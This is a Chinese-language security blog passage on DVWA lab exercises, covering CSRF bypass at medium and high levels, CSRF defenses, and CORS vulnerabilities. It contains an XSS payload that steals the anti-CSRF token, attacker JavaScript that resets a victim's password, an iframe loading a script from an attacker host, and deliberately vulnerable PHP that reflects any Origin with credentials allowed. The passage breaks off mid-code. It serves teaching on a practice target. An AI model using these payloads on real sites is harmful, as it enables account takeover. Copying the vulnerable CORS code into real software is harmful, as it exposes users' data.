<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Checks to see where the request came from</span></span><br><span class="line">	<span class="keyword">if</span>( stripos( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">		<span class="comment">// Get input</span></span><br><span class="line">		<span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">		<span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Do the passwords match?</span></span><br><span class="line">		<span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">			<span class="comment">// They do!</span></span><br><span class="line">			<span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">			<span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Update the database</span></span><br><span class="line">			<span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">			<span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">			<span class="comment">// Feedback for the user</span></span><br><span class="line">			<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// Issue with passwords matching</span></span><br><span class="line">			<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>stripos(a,b)</code>返回 b 存在于 a，字符串开始的位置，字符串起始位置为0，如果未发现 b 则返回false。代码检查了保留变量<code>HTTP_REFERER</code> （http包头部的Referer字段的值，表示来源地址）是否包含<code>SERVER_NAME</code>（http包头部的 Host 字段表示要访问的主机名）。</p>
<p>针对这一种过滤规则，有人可能会想到将攻击的页面的源文件名改为<code>Host字段的主机名.html</code>，是不是就可以让Referer参数值包含主机名从而达到绕过呢？</p>
<p>答案是不可行的，因为浏览器并不允许跨域请求，当出现跨域时，Referer便会遵循同源策略，Referer的值会自动将后面的路径去除。</p>
<p><img src="https://i.loli.net/2021/11/18/t5LbWAYTV34jeyp.png" alt="image-20211118160147989"></p>
<p>但是，假如受害者登录的服务器域名为126.com，如果不验证根域名为126.com 那么可以让攻击者的服务器域名为126.com.xxx.com，这样便可以达到绕过。</p>
<p>也可以使用HTML注入或者XSS的方式进行绕过。</p>
<p><img src="https://i.loli.net/2021/11/18/TNl31QZdktbjmeH.png" alt="image-20211118162838291"></p>
<h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><p>源代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Get input</span></span><br><span class="line">	<span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">	<span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Do the passwords match?</span></span><br><span class="line">	<span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">		<span class="comment">// They do!</span></span><br><span class="line">		<span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">		<span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Update the database</span></span><br><span class="line">		<span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Feedback for the user</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">// Issue with passwords matching</span></span><br><span class="line">		<span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>high级别的源码中加入了Anti-csrf token机制，由checkToken函数来实现，用户每次访问更改密码页面时，服务器会返回一个随机的token，之后每次向服务器发起请求，服务器会优先验证token，如果token正确，那么才会处理请求。所以我们在发起请求之前需要获取服务器返回的user_token，利用user_token绕过验证。</p>
<p>在审查页面元素时，我们可以在表单隐藏域中找到token。</p>
<p><img src="https://i.loli.net/2021/11/18/4RUdQOWD6PrltbJ.png" alt="image-20211118165220341"></p>
<p>我们可以结合XSS来获取token。测试代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;../csrf&quot;</span> <span class="attr">onload</span>=<span class="string">alert(frames[0].document.getElementsByName(</span>&#x27;<span class="attr">user_token</span>&#x27;)[<span class="attr">0</span>]<span class="attr">.value</span>)&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/18/BalTIiVDUPgGAeF.png" alt="image-20211118170531294"></p>
<p>结合CSRF构造我们的攻击代码。</p>
<p>攻击者的恶意JS代码：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">http_server = <span class="string">&quot;http://192.168.123.42/DVWA/vulnerabilities/csrf/&quot;</span>;</span><br><span class="line">password = <span class="number">123456</span>;</span><br><span class="line">token = frames[<span class="number">0</span>].document.getElementsByName(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line"><span class="keyword">new</span> Image().src = http_server + <span class="string">&quot;?password_new=&quot;</span>+password+<span class="string">&quot;&amp;password_conf=&quot;</span>+password+<span class="string">&quot;&amp;Change=Change&amp;user_token=&quot;</span>+token;</span><br></pre></td></tr></table></figure>
<p>注入的XSS代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;../csrf&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span> <span class="attr">onload</span>=<span class="string">eval(</span>&quot;<span class="attr">appendChild</span>(<span class="attr">createElement</span>(&#x27;<span class="attr">script</span>&#x27;))<span class="attr">.src</span>=<span class="string">&#x27;http://hackmee.com/attack/attack_token.js&#x27;</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>
<p>当受害者访问注入了XSS代码的页面时，密码便会被修改。</p>
<h2 id="CSRF的防御"><a href="#CSRF的防御" class="headerlink" title="CSRF的防御"></a>CSRF的防御</h2><h3 id="检验HTTP-Referer"><a href="#检验HTTP-Referer" class="headerlink" title="检验HTTP Referer"></a>检验HTTP Referer</h3><p>在HTTP头中通常有一个Referer字段，该字段记录了HTTP请求的来源地址，通过检查来源地址是来自站内还是来自远程的恶意页面，能够解决从站外发起的CSRF攻击，顺便解决非法盗链、站外提交等问题。</p>
<h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>该方法的实现思路是：每次用户提交内容时，都要求其在表单中填写图片上的随机验证码，并且在提交表单后对其进行检测。</p>
<p>使用验证码技术不但可以抵御CSRF，还可以防止恶意注册、登录、灌水和提交信息等行为。验证码对于用户来讲应该非常熟悉，它通常是将一串随机产生的数字或符号生成一幅图片，并在图片里添加一些干扰象素，然后由用户识别验证码信息再输入表单进行提交，网站验证成功后才能使用某项功能。</p>
<h3 id="使用Token"><a href="#使用Token" class="headerlink" title="使用Token"></a>使用Token</h3><p>CSRF之所以成功的一个重要原因是：攻击者能够预知和伪造请求中的关键字段，因此，在请求中放入攻击者不能伪造的信息就能起到防范CSRF的作用。</p>
<p>例如，在 HTTP请求中以参数的形式加入一个随机产生的请求令牌（Token)，并在服务器端对其进行验证。如果请求中没有Token或者Token 内容不正确，则认为可能是CSRF攻击而拒绝该请求。</p>
<p>实际上，请求令牌和验证码的原理是一样的，只不过目的不同，前者是为了保证收到的请求一定来自预期的页面，后者主要是为了解决POST请求重复提交的问题。</p>
<blockquote>
<p>以上介绍的几种CSRF 防御手段各有利弊，没有一种方法是完美的。我们要谨记一点：无论网站的CSRF防范有多么严密，只要网站有其他安全漏洞（如XSS)，那么攻击者仍然可以绕过安全防护发动攻击。</p>
</blockquote>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>邱永华 著《XSS跨站脚本攻击剖析与防御》</li>
<li>吴翰清 著《白帽子讲Web安全》</li>
<li><a href="https://www.cnblogs.com/s1awwhy/p/13974205.html">DVWA全级别通关笔记（三）— CSRF（跨站请求伪造） - s1awwhy - 博客园 (cnblogs.com)</a></li>
<li><a href="https://www.cnblogs.com/zhengna/p/12736823.html">DVWA-3.3 CSRF（跨站请求伪造）-High-绕过token - zhengna - 博客园 (cnblogs.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>CSRF跨站请求伪造</category>
      </categories>
      <tags>
        <tag>CSRF跨站请求伪造</tag>
      </tags>
  </entry>
  <entry>
    <title>CORS跨域漏洞</title>
    <url>/post/801d1727.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="同源安全策略"><a href="#同源安全策略" class="headerlink" title="同源安全策略"></a>同源安全策略</h2><p>同源策略（Same Origin Policy）是一个很重要的安全理念，是客户端脚本的重要的安全度量标准，其目的是防止某个文档或脚本从多个不同源进行装载。</p>
<p>根据这个策略，a.com域名下的JavaScript无法跨域操作b.com域名下的对象。比如，baidu.com域名下的页面包含的JavaScript代码，不能访问google.com域名下的页面内容。</p>
<p>JavaScript必须严格遵循浏览器的的同源策略，包含Ajax（事实上，Ajax也是由JavaScript组成）。通过XMLHttpRequest对象实现的Ajax请求，不能向不同的域提交，比如，在abc.test.com下的页面，不能向def.test.com提交Ajax请求。</p>
<p>这里的“同源”指的是<strong>同协议、同域名、同端口</strong>。</p>
<p><img src="https://i.loli.net/2021/11/19/mNQ7Y9coDdRGOKE.jpg" alt="image"></p>
<p>关于JavaScript能否跨域通信的详细说明，见下表：</p>
<p><code>http://www.a.com/a.js</code>访问以下URL的结果</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>URL</th>
<th>是否允许通信</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>http://www.a.com/b.js</code></td>
<td>是</td>
<td>同域名同端口同协议</td>
</tr>
<tr>
<td><code>http://www.a.com/Script/b.js</code></td>
<td>是</td>
<td>同域名同端口同协议，不同目录</td>
</tr>
<tr>
<td><code>http://www.a.com:8080/b.js</code></td>
<td>否</td>
<td>同域名不同端口</td>
</tr>
<tr>
<td><code>https://www.a.com/b.js</code></td>
<td>否</td>
<td>同域名不同协议</td>
</tr>
<tr>
<td><code>http://70.32.92.43/b.js</code></td>
<td>否</td>
<td>域名和域名对应的IP</td>
</tr>
<tr>
<td><code>http://test.a.com/b.js</code></td>
<td>否</td>
<td>主域名相同，子域名不同</td>
</tr>
<tr>
<td><code>http://a.com/b.js</code></td>
<td>否</td>
<td>主域名相同，子域名不同</td>
</tr>
<tr>
<td><code>http://www.b.com/b.js</code></td>
<td>否</td>
<td>不同域名</td>
</tr>
</tbody>
</table>
</div>
<p>由此可见，同源策略认为来自其它任何站点的装载内容都是不安全的。</p>
<p><img src="http://www.godrry.com/usr/uploads/2019/09/427390721.gif" alt="![XurRR](https://i.loli.net/2021/11/20/zeqiV62oPhKH8BD.gif)"></p>
<p><img src="http://www.godrry.com/usr/uploads/2019/09/3632167158.gif" alt="![](https://i.loli.net/2021/11/20/xgKWcPLFRrqNeYy.gif)"></p>
<p>这个限制十分重要。假设攻击者利用Iframe把真正的银行登录页面嵌到他的页面上，当用户使用真实用户名、密码登录时，该页面就可以通过JavaScript读取到用户名表单的内容，这样用户名和密码信息就被泄露了。</p>
<p>而运用了同源安全策略后，用户就能确保自己正在查看的页面确实来自正在浏览的域。</p>
<p>然而，受到同源策略的影响，跨域资源共享就会受到制约。当进行一些比较深入的前端编程的时候，不可避免地需要进行跨域操作，这时候同源策略就会显得过于苛刻。于是开发者就会想出各种各样的跨域方法，比如使用CORS、JSONP等。虽然跨域技术能带来更多功能，但是功能的开放也意味着安全的风险。</p>
<p>即便是有了浏览器沙箱和同源策略的保护，用户依然会受到黑客的各种攻击，XSS跨站脚本就是最大的威胁之一。</p>
<h2 id="CORS的介绍"><a href="#CORS的介绍" class="headerlink" title="CORS的介绍"></a>CORS的介绍</h2><p>CORS（Cross-Origin Resource Sharing，跨域资源共享）是一种放宽浏览器的同源策略，利用这种策略可以通过浏览器使不同的网站和不同服务器之间实现通信。具体来说，这种策略通过设置HTTP头部字段，使客户端有资格跨域访问资源。通过服务器验证和授权后，浏览器有责任支持这些HTTP头部字段并且确保能够正确地施加限制。</p>
<p>CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。</p>
<p>整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p>
<p>因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。</p>
<p>相关的HTTP头部字段所代表的含义和介绍如下表所示：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>请求类型</th>
<th>请求字段</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>请求头</td>
<td>Origin</td>
<td>用来说明请求从哪里发起，包括且仅仅包括协议和域名<br>该参数一般只存在于CORS跨域请求中，可以看到response有对应的header: Access-Control-Allow-Origin</td>
</tr>
<tr>
<td>请求头</td>
<td>Access-Control-Request-Method</td>
<td>发出请求时报头用于预检请求，让服务器知道哪些HTTP方法的实际请求时将被使用</td>
</tr>
<tr>
<td>请求头</td>
<td>Access-Control-Request-Headers</td>
<td>用于通知服务器在真正的请求中会采用哪些请求头</td>
</tr>
<tr>
<td>响应头</td>
<td>Access-Control-Allow-Origin</td>
<td>指定允许访问资源的外域URI，对携带身份证的请求不可使用通配符（*）</td>
</tr>
<tr>
<td>响应头</td>
<td>Access-Control-Allow-Credentials</td>
<td>用于通知浏览器是否允许读取response的内容</td>
</tr>
</tbody>
</table>
</div>
<p>CORS漏洞，既然是用于跨域场景，自然少不了跨域中经常存在的一些安全问题，例如信息泄露等等，CORS的漏洞主要来源于服务端对于Origin的弱校验，从而导致黑客只要构造了一个CORS请求，就能跨域获取到信息。</p>
<p>如果不启用cors的时候，恶意脚本发出一个请求之后发生的事情：</p>
<p><img src="https://i.loli.net/2021/11/20/BurGRWfIqE5SyCZ.png" alt="img"></p>
<p>默认情况下，如果没有设置“Access-Control-Allow-Credentials”这个头的话，浏览器发送的请求就不会带有用户的身份数据（cookie或者HTTP身份数据），所以就不会泄露用户隐私信息。</p>
<p><img src="https://i.loli.net/2021/11/20/iTWDaZu1Bb75Jfw.png" alt="img"></p>
<h2 id="简单请求与非简单请求"><a href="#简单请求与非简单请求" class="headerlink" title="简单请求与非简单请求"></a>简单请求与非简单请求</h2><p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p>
<p>只要同时满足以下两大条件，就属于简单请求。</p>
<blockquote>
<p>（1）请求方法是以下三种方法之一：</p>
<ul>
<li>HEAD</li>
<li>GET</li>
<li>POST</li>
</ul>
<p>（2）HTTP的头信息不超出以下几种字段：</p>
<ul>
<li>Accept</li>
<li>Accept-Language</li>
<li>Content-Language</li>
<li>Last-Event-ID</li>
<li>Content-Type：只限于三个值<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code></li>
</ul>
</blockquote>
<p>这是为了兼容表单（form），因为历史上表单一直可以发出跨域请求。AJAX 的跨域设计就是，只要表单可以发，AJAX 就可以直接发。</p>
<p>凡是不同时满足上面两个条件，就属于非简单请求。</p>
<p>浏览器对这两种请求的处理，是不一样的。</p>
<p><img src="https://img-blog.csdnimg.cn/20191024132300691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM4MTAzNjU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20191024132320519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM4MTAzNjU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<blockquote>
<p>有关这两种请求的详细流程可以参考如下文章：</p>
<p><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">https://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>
</blockquote>
<h2 id="靶场演示"><a href="#靶场演示" class="headerlink" title="靶场演示"></a>靶场演示</h2><h3 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h3><p>我们基于DVWA靶场简单写了一个获取当前用户信息的接口。</p>
<p>源代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">&quot;Content-Type: text/plain&quot;</span>);</span><br><span class="line">    define( <span class="string">&#x27;DVWA_WEB_PAGE_TO_ROOT&#x27;</span>, <span class="string">&#x27;../../&#x27;</span> );</span><br><span class="line">	<span class="keyword">require_once</span> DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;dvwa/includes/dvwaPage.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	dvwaPageStartup( <span class="keyword">array</span>( <span class="string">&#x27;authenticated&#x27;</span>, <span class="string">&#x27;phpids&#x27;</span> ) );</span><br><span class="line">	dvwaDatabaseConnect();</span><br><span class="line"></span><br><span class="line">	<span class="variable">$query</span>  = <span class="string">&quot;SELECT user_id, first_name, last_name, user, last_login FROM users WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> );</span><br><span class="line">	<span class="variable">$row</span> = mysqli_fetch_row( <span class="variable">$result</span> );</span><br><span class="line"></span><br><span class="line">	printf (<span class="string">&#x27;&#123;&quot;user_id&quot;:&quot;%d&quot;,&quot;first_name&quot;:&quot;%s&quot;,&quot;last_name&quot;:&quot;%s&quot;,&quot;user&quot;:&quot;%s&quot;,&quot;last_login&quot;:&quot;%s&quot;&#125;&#x27;</span>,<span class="variable">$row</span>[<span class="number">0</span>],<span class="variable">$row</span>[<span class="number">1</span>],<span class="variable">$row</span>[<span class="number">2</span>],<span class="variable">$row</span>[<span class="number">3</span>],<span class="variable">$row</span>[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>我们尝试使用Ajax去请求这个用户接口，代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>CORS Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">		<span class="function"><span class="keyword">function</span> <span class="title">ajaxfunction</span>(<span class="params">the_request_url</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> xmlHttp;</span></span><br><span class="line"><span class="javascript">			xmlHttp = <span class="keyword">new</span> XMLHttpRequest();	</span></span><br><span class="line"><span class="javascript">		</span></span><br><span class="line"><span class="javascript">			<span class="keyword">if</span> (xmlHttp) &#123;</span></span><br><span class="line"><span class="javascript">				xmlHttp.open(<span class="string">&#x27;GET&#x27;</span>, the_request_url, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">				xmlHttp.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">					<span class="keyword">if</span> (xmlHttp.readyState == <span class="number">4</span> &amp;&amp; xmlHttp.status == <span class="number">200</span>) &#123;</span></span><br><span class="line"><span class="javascript">						<span class="built_in">document</span>.getElementById(<span class="string">&#x27;info&#x27;</span>).innerHTML = xmlHttp.responseText;</span></span><br><span class="line"><span class="javascript">					&#125;</span></span><br><span class="line"><span class="javascript">				&#125;;</span></span><br><span class="line"><span class="javascript">				xmlHttp.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line"><span class="javascript">				xmlHttp.send(<span class="literal">null</span>);</span></span><br><span class="line"><span class="javascript">			&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">				alert(<span class="string">&#x27;error&#x27;</span>);</span></span><br><span class="line"><span class="javascript">			&#125;</span></span><br><span class="line"><span class="javascript">		&#125;</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span> <span class="attr">value</span>=<span class="string">&quot;get info&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;javascript:ajaxfunction(&#x27;http://hackrock.com:812/vulnerabilities/cors/&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;info&quot;</span> <span class="attr">style</span>=<span class="string">&#x27;width: 800px; height: 100px;&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>发现请求失败，原因是因为缺少<code>Access-Control-Allow-Credentials</code>头部</p>
<p><img src="https://i.loli.net/2021/11/20/Jjt3heNrBygo4KR.png" alt="image-20211120175804233"></p>
<p>修改源代码，使其可以通过CORS被Ajax请求</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span> (@<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>])&#123;</span><br><span class="line">		header(<span class="string">&quot;Access-Control-Allow-Origin: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>]);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		header(<span class="string">&quot;Access-Control-Allow-Origin: *&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	header(<span class="string">&quot;Access-Control-Allow-Headers: X-Requested-With&quot;</span>);</span><br><span class="line">	header(<span class="string">&quot;Access-Control-Allow-Credentials: true&quot;</span>);</span><br><span class="line">	header(<span class="string">&quot;Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	header(<span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line">	define( <span class="string">&#x27;DVWA_WEB_PAGE_TO_ROOT&#x27;</span>, <span class="string">&#x27;../../&#x27;</span> );</span><br><span class="line">	<span class="keyword">require_once</span> DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;dvwa/includes/dvwaPage.inc.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	dvwaPageStartup( <span 